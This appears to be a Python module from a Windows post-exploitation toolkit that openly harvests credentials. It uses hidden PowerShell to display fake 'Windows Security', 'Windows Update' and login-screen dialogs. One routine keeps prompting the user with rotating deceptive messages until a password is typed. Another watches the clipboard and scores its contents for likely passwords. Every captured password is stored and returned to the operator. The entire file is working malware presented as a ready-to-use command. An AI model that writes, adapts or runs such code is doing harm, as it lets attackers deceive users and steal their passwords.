#!/usr/bin/env python3
"""
Elite Ask Password Command - Social engineering password collection
Advanced password prompting with credential harvesting
"""

import ctypes
from ctypes import wintypes
import subprocess
import os
import time
import threading

class EliteAskPassword:
    """Elite password collection through social engineering"""
    
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32
        self.collected_passwords = []
        
    def execute(self, method='dialog', title=None, message=None, timeout=60):
        """Collect passwords using various social engineering methods"""
        try:
            if method == 'dialog':
                return self._show_password_dialog(title, message, timeout)
            elif method == 'fake_login':
                return self._show_fake_login(timeout)
            elif method == 'security_prompt':
                return self._show_security_prompt(timeout)
            elif method == 'update_prompt':
                return self._show_update_prompt(timeout)
            elif method == 'persistent':
                return self._persistent_password_prompt(timeout)
            elif method == 'clipboard_monitor':
                return self._monitor_clipboard_passwords(timeout)
            else:
                return {
                    'success': False,
                    'error': f'Unknown method: {method}',
                    'available_methods': ['dialog', 'fake_login', 'security_prompt', 'update_prompt', 'persistent', 'clipboard_monitor']
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Password collection failed: {str(e)}'
            }
    
    def _show_password_dialog(self, title, message, timeout):
        """Show a password dialog box"""
        try:
            if not title:
                title = "Windows Security"
            if not message:
                message = "Please enter your password to continue:"
            
            # Create PowerShell script for password dialog
            ps_script = f'''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "{title}"
$form.Size = New-Object System.Drawing.Size(400,200)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Location = New-Object System.Drawing.Point(10,20)
$label.Size = New-Object System.Drawing.Size(370,40)
$label.Text = "{message}"
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(10,70)
$textBox.Size = New-Object System.Drawing.Size(360,20)
$textBox.UseSystemPasswordChar = $true
$form.Controls.Add($textBox)

$okButton = New-Object System.Windows.Forms.Button
$okButton.Location = New-Object System.Drawing.Point(150,110)
$okButton.Size = New-Object System.Drawing.Size(75,23)
$okButton.Text = "OK"
$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $okButton
$form.Controls.Add($okButton)

$cancelButton = New-Object System.Windows.Forms.Button
$cancelButton.Location = New-Object System.Drawing.Point(230,110)
$cancelButton.Size = New-Object System.Drawing.Size(75,23)
$cancelButton.Text = "Cancel"
$cancelButton.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.CancelButton = $cancelButton
$form.Controls.Add($cancelButton)

$textBox.Focus()
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {{
    Write-Output "PASSWORD:$($textBox.Text)"
}} else {{
    Write-Output "CANCELLED"
}}
'''
            
            # Execute PowerShell script with timeout
            try:
                result = subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=timeout)
                
                if result.returncode == 0:
                    output = result.stdout.strip()
                    if output.startswith('PASSWORD:'):
                        password = output[9:]  # Remove "PASSWORD:" prefix
                        
                        # Store collected password
                        self.collected_passwords.append({
                            'method': 'dialog',
                            'password': password,
                            'timestamp': time.time(),
                            'title': title,
                            'message': message
                        })
                        
                        return {
                            'success': True,
                            'password_collected': True,
                            'password': password,
                            'method': 'dialog',
                            'message': 'Password successfully collected'
                        }
                    elif output == 'CANCELLED':
                        return {
                            'success': True,
                            'password_collected': False,
                            'message': 'User cancelled password dialog'
                        }
                
                return {
                    'success': False,
                    'error': 'Password dialog failed to execute'
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': f'Password dialog timed out after {timeout} seconds'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to show password dialog: {str(e)}'
            }
    
    def _show_fake_login(self, timeout):
        """Show fake Windows login screen"""
        try:
            # Create fake Windows login screen
            ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Security"
$form.Size = New-Object System.Drawing.Size(450,300)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false
$form.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)

# Windows logo (text representation)
$logoLabel = New-Object System.Windows.Forms.Label
$logoLabel.Location = New-Object System.Drawing.Point(180,20)
$logoLabel.Size = New-Object System.Drawing.Size(100,30)
$logoLabel.Text = "Windows"
$logoLabel.ForeColor = [System.Drawing.Color]::White
$logoLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
$form.Controls.Add($logoLabel)

# User icon and name
$userLabel = New-Object System.Windows.Forms.Label
$userLabel.Location = New-Object System.Drawing.Point(150,80)
$userLabel.Size = New-Object System.Drawing.Size(150,30)
$userLabel.Text = "$env:USERNAME"
$userLabel.ForeColor = [System.Drawing.Color]::White
$userLabel.Font = New-Object System.Drawing.Font("Arial",12)
$userLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($userLabel)

# Password prompt
$promptLabel = New-Object System.Windows.Forms.Label
$promptLabel.Location = New-Object System.Drawing.Point(100,120)
$promptLabel.Size = New-Object System.Drawing.Size(250,20)
$promptLabel.Text = "Enter your password"
$promptLabel.ForeColor = [System.Drawing.Color]::White
$promptLabel.Font = New-Object System.Drawing.Font("Arial",10)
$promptLabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
$form.Controls.Add($promptLabel)

# Password textbox
$passwordBox = New-Object System.Windows.Forms.TextBox
$passwordBox.Location = New-Object System.Drawing.Point(100,150)
$passwordBox.Size = New-Object System.Drawing.Size(250,25)
$passwordBox.UseSystemPasswordChar = $true
$passwordBox.Font = New-Object System.Drawing.Font("Arial",12)
$form.Controls.Add($passwordBox)

# Sign in button
$signInButton = New-Object System.Windows.Forms.Button
$signInButton.Location = New-Object System.Drawing.Point(175,190)
$signInButton.Size = New-Object System.Drawing.Size(100,30)
$signInButton.Text = "Sign in"
$signInButton.BackColor = [System.Drawing.Color]::FromArgb(0,120,215)
$signInButton.ForeColor = [System.Drawing.Color]::White
$signInButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$signInButton.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.AcceptButton = $signInButton
$form.Controls.Add($signInButton)

$passwordBox.Focus()
$result = $form.ShowDialog()

if ($result -eq [System.Windows.Forms.DialogResult]::OK) {
    Write-Output "PASSWORD:$($passwordBox.Text)"
} else {
    Write-Output "CANCELLED"
}
'''
            
            try:
                result = subprocess.run(['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script], 
                                      capture_output=True, text=True, timeout=timeout)
                
                if result.returncode == 0:
                    output = result.stdout.strip()
                    if output.startswith('PASSWORD:'):
                        password = output[9:]
                        
                        self.collected_passwords.append({
                            'method': 'fake_login',
                            'password': password,
                            'timestamp': time.time(),
                            'username': os.environ.get('USERNAME', 'Unknown')
                        })
                        
                        return {
                            'success': True,
                            'password_collected': True,
                            'password': password,
                            'method': 'fake_login',
                            'message': 'Password collected via fake login screen'
                        }
                
                return {
                    'success': False,
                    'error': 'Fake login screen failed'
                }
                
            except subprocess.TimeoutExpired:
                return {
                    'success': False,
                    'error': f'Fake login timed out after {timeout} seconds'
                }
                
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to show fake login: {str(e)}'
            }
    
    def _show_security_prompt(self, timeout):
        """Show fake security verification prompt"""
        try:
            title = "Windows Security Verification"
            message = "For security reasons, please verify your identity by entering your password:"
            
            return self._show_password_dialog(title, message, timeout)
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Security prompt failed: {str(e)}'
            }
    
    def _show_update_prompt(self, timeout):
        """Show fake Windows update prompt requiring password"""
        try:
            title = "Windows Update"
            message = "Windows needs to install important security updates. Please enter your password to continue:"
            
            return self._show_password_dialog(title, message, timeout)
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Update prompt failed: {str(e)}'
            }
    
    def _persistent_password_prompt(self, timeout):
        """Show persistent password prompts until user enters password"""
        try:
            start_time = time.time()
            attempts = 0
            
            while time.time() - start_time < timeout:
                attempts += 1
                
                # Vary the message to make it more convincing
                messages = [
                    "Your session has expired. Please re-enter your password:",
                    "Windows needs to verify your identity. Enter your password:",
                    "Security check required. Please enter your password:",
                    "Authentication required to continue. Enter your password:"
                ]
                
                message = messages[attempts % len(messages)]
                title = "Windows Security"
                
                result = self._show_password_dialog(title, message, 30)  # 30 second timeout per attempt
                
                if result.get('password_collected'):
                    result['attempts'] = attempts
                    result['method'] = 'persistent'
                    return result
                
                # Wait before next attempt
                time.sleep(5)
            
            return {
                'success': False,
                'error': f'Persistent prompting timed out after {attempts} attempts',
                'attempts': attempts
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Persistent prompting failed: {str(e)}'
            }
    
    def _monitor_clipboard_passwords(self, timeout):
        """Monitor clipboard for potential passwords"""
        try:
            import win32clipboard
            import win32con
            
            start_time = time.time()
            previous_clipboard = ""
            potential_passwords = []
            
            while time.time() - start_time < timeout:
                try:
                    # Get clipboard content
                    win32clipboard.OpenClipboard()
                    clipboard_data = win32clipboard.GetClipboardData(win32con.CF_TEXT)
                    win32clipboard.CloseClipboard()
                    
                    if clipboard_data and clipboard_data != previous_clipboard:
                        # Check if clipboard content looks like a password
                        if self._looks_like_password(clipboard_data):
                            potential_passwords.append({
                                'content': clipboard_data,
                                'timestamp': time.time(),
                                'confidence': self._calculate_password_confidence(clipboard_data)
                            })
                        
                        previous_clipboard = clipboard_data
                
                except Exception:
                    pass
                
                time.sleep(1)  # Check every second
            
            if potential_passwords:
                # Sort by confidence
                potential_passwords.sort(key=lambda x: x['confidence'], reverse=True)
                
                return {
                    'success': True,
                    'method': 'clipboard_monitor',
                    'potential_passwords': potential_passwords,
                    'message': f'Found {len(potential_passwords)} potential passwords in clipboard'
                }
            else:
                return {
                    'success': False,
                    'error': 'No potential passwords found in clipboard',
                    'method': 'clipboard_monitor'
                }
                
        except ImportError:
            return {
                'success': False,
                'error': 'win32clipboard module not available'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Clipboard monitoring failed: {str(e)}'
            }
    
    def _looks_like_password(self, text):
        """Check if text looks like a password"""
        try:
            if not text or len(text) < 4 or len(text) > 50:
                return False
            
            # Check for password characteristics
            has_upper = any(c.isupper() for c in text)
            has_lower = any(c.islower() for c in text)
            has_digit = any(c.isdigit() for c in text)
            has_special = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in text)
            
            # Must have at least 2 character types
            char_types = sum([has_upper, has_lower, has_digit, has_special])
            
            # Should not contain common words or patterns
            common_words = ['password', 'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all']
            text_lower = text.lower()
            
            for word in common_words:
                if word in text_lower:
                    return False
            
            return char_types >= 2
            
        except:
            return False
    
    def _calculate_password_confidence(self, text):
        """Calculate confidence that text is a password (0-100)"""
        try:
            confidence = 0
            
            # Length scoring
            if 8 <= len(text) <= 20:
                confidence += 30
            elif 6 <= len(text) <= 30:
                confidence += 20
            
            # Character variety scoring
            has_upper = any(c.isupper() for c in text)
            has_lower = any(c.islower() for c in text)
            has_digit = any(c.isdigit() for c in text)
            has_special = any(c in '!@#$%^&*()_+-=[]{}|;:,.<>?' for c in text)
            
            confidence += sum([has_upper, has_lower, has_digit, has_special]) * 10
            
            # No spaces (typical for passwords)
            if ' ' not in text:
                confidence += 20
            
            # Not all same character
            if len(set(text)) > 1:
                confidence += 10
            
            return min(confidence, 100)
            
        except:
            return 0
    
    def get_collected_passwords(self):
        """Get all collected passwords"""
        try:
            return {
                'success': True,
                'total_collected': len(self.collected_passwords),
                'passwords': self.collected_passwords
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to get collected passwords: {str(e)}'
            }
    
    def clear_collected_passwords(self):
        """Clear collected passwords"""
        try:
            count = len(self.collected_passwords)
            self.collected_passwords.clear()
            
            return {
                'success': True,
                'message': f'Cleared {count} collected passwords'
            }
            
        except Exception as e:
            return {
                'success': False,
                'error': f'Failed to clear passwords: {str(e)}'
            }

def elite_askpassword(method='dialog', title=None, message=None, timeout=60):
    """Elite askpassword command entry point"""
    askpass_cmd = EliteAskPassword()
    return askpass_cmd.execute(method, title, message, timeout)